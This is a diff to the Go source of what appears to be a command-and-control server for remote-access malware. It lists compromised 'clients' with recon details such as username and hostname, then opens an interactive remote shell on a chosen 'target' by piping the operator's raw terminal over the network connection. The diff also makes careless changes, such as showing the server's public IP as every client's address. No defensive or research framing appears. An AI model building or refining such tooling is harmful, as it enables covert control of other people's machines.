@@ -5,11 +5,15 @@ import (
 	"database/sql"
 	"encoding/json"
 	"fmt"
+	"io"
 	"net"
 	"os"
 	"strconv"
 	"strings"
 	"time"
+
+
+	"golang.org/x/term"
 
 	_ "modernc.org/sqlite"
 )
@@ -215,17 +219,15 @@ func listClients() {
 		osName := row["os"].(string)
 		lastSeen := row["last_seen"].(string)
 
-		addr := ""
+		addr := publicIP
+		/*addr := ""
 		if c, ok := clients[id]; ok {
 			addr = c.Addr
-		}
+		}*/
 
 		status := fmt.Sprintf("%s● active%s", colorGreen, colorReset)
 		if active == 0 {
-			status = fmt.Sprintf("%s○ stale%s", colorRed, colorReset)
-			if addr == "" {
-				addr = "-"
-			}
+			status = fmt.Sprintf("%s○ meh%s", colorRed, colorReset)
 		}
 
 		if publicIP == "" {
@@ -245,15 +247,17 @@ func sendCommand(c *Client, cmd string) error {
 }
 
 func handleShell(c *Client) {
-	fmt.Printf("entering shell on client %d (%s@%s)\n", c.ID, c.Recon.Username, c.Recon.Hostname)
-	fmt.Println("type 'exit' to leave shell")
+	fmt.Printf("Entering shell on client %d...\n", c.ID)
 
 	if err := sendCommand(c, "shell"); err != nil {
 		fmt.Printf("failed to send command: %v\n", err)
 		return
 	}
 
-	// Wait for shell_ready via JSON (last JSON message)
+	// 1. Read JSON carefully. Because of json.Decoder buffering, 
+	// we CANNOT use c.Conn directly after this easily if the client sent extra bytes.
+	// However, since the client waits to send shell output *after* this JSON is sent,
+	// the connection buffer immediately following this is clean.
 	for {
 		var msg struct {
 			Status string `json:"status"`
@@ -267,38 +271,37 @@ func handleShell(c *Client) {
 		}
 	}
 
-	// Now switch to raw byte I/O — no more JSON decoder
-	done := make(chan struct{})
-	go func() {
-		defer close(done)
-		reader := bufio.NewReader(c.Conn)
-		for {
-			line, err := reader.ReadString('\n')
-			if err != nil {
-				return
-			}
-			if strings.Contains(line, "__ZHENG_SHELL_DONE__") {
-				fmt.Printf("\nshell exited on client %d\n", c.ID)
-				return
-			}
-			fmt.Print(line)
-		}
+	// 2. Put YOUR local operator terminal into Raw Mode.
+	// This ensures tabs, arrow keys, and Ctrl+C are forwarded directly to the target.
+	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
+	if err != nil {
+		fmt.Printf("failed to set raw terminal mode: %v\n", err)
+		return
+	}
+	// Crucial: Restore original state when exiting the shell function
+	defer func() {
+		_ = term.Restore(int(os.Stdin.Fd()), oldState)
+		fmt.Println("\n--- Exited Shell ---")
 	}()
 
-	// Read stdin and send raw to conn
-	scanner := bufio.NewScanner(os.Stdin)
-	for scanner.Scan() {
-		line := scanner.Text()
-		if line == "exit" {
-			fmt.Fprintf(c.Conn, "exit\n")
-			fmt.Printf("leaving shell on client %d\n", c.ID)
-			return
-		}
-		fmt.Fprintf(c.Conn, "%s\n", line)
-	}
+	// 3. Direct raw I/O pipelines (No more bufio string/line scanners)
+	done := make(chan struct{})
 
+	// Copy remote client shell output directly to local stdout
+	go func() {
+		_, _ = io.Copy(os.Stdout, c.Conn)
+		close(done)
+	}()
+
+	// Copy local operator typing directly down the network wire
+	go func() {
+		_, _ = io.Copy(c.Conn, os.Stdin)
+	}()
+
+	// Block until the network connection drops or the shell exits
 	<-done
 }
+
 
 func watchClient(c *Client) {
 	// Block until connection drops
